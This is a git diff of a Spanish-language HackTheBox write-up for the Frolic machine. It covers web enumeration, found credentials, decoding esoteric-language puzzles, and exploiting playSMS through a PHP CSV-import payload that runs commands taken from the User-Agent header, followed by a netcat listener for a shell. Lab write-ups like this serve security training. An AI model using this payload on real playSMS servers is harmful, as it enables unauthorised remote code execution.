@@ -1,5 +1,9 @@
 10.10.10.111 Frolic
+
+![Frolic](https://user-images.githubusercontent.com/96772264/198895612-142d24de-7393-4cd0-950a-56fe560ab910.png)
+
 -------------------
+# Part 1: Enumeración web 
 
 Puertos abiertos
 22,139,445,1880,9999
@@ -33,6 +37,8 @@ Formulario de registro, pone "vamos, soy hackeable, Nota: Nada", tira de /js/log
 tres intentos de login, pero da las contraseñas admin:superduperlooperpassword_lol, aun asi no hace falta 
 ponerle porque nos da la ruta *success.html* que viene a ser muchos "." "?" y "!" 
 
+![forlic1](https://user-images.githubusercontent.com/96772264/198895706-684947e3-cd43-41a3-a044-3192a085b075.PNG)
+
 /test
 es un phpinfo()
 
@@ -43,6 +49,9 @@ password.txt user.txt loop/
 - /loop -> forbidden
 
 Estas creds no me sirven para el node-red.
+
+-------------------
+# Part 2: Lenguajes Esotericos 
 
 El mensaje success.html (muchas series de 5 caracteres mezclando ".","?" y "!" -> ej .!?!!)
 Eso es un "esoteric programming languaje", en concreto Ook!
@@ -65,8 +74,7 @@ Pongo la contraseña *password* y crea un index.php, que es un codigo hexadecima
 base64:
 
 ```
-Original (dexadecimal)
-
+# Original (dexadecimal)
 4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c533
 0674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974
 624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b3173745069736
@@ -74,13 +82,13 @@ Original (dexadecimal)
 73674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c53346750437
 3724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
 
-xxd -ps -r > texto en base64
+# xxd -ps -r > texto en base64
 KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
 KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
 K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t
 LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==
 
-Quitando los saltos de linea y decodificandolo
+# Quitando los saltos de linea y decodificandolo
 +++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
 ++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
 <]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
@@ -97,7 +105,11 @@ Nos da un 403, pero aun asi se puede fuzzear
 ```
 /backup -> 
 Nos da la ruta /playsms, hay un panel de registro al que ingresamos con admin:idkwhatispass.
-COmo es una web muy amplia, buscamos vulnerabilidadades con el searchploit.
+
+-------------------
+# Part 3: Explotando playsms
+
+Como es una web muy amplia, buscamos vulnerabilidadades con el searchploit.
 Hay varios exploits que contemplan la ruta "import.php"
 
 Exploit php/webapps/42044.txt:
@@ -119,6 +131,11 @@ Y el exploit seria tal que asi
 Name,Mobile,Email,Group code,Tags
 <?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>,22,NULL,NULL,NULL
 ```
+![forlic2](https://user-images.githubusercontent.com/96772264/198895730-23444d3a-ed66-46ce-b917-837327ad2d3c.PNG)
+![forlic3](https://user-images.githubusercontent.com/96772264/198895739-e7175968-0c5a-4922-899b-b96f77bd3a62.PNG)
+
+-------------------
+# Part 4: Ret2libc 
 
 ```console
 └─$ sudo nc -nlvp 443
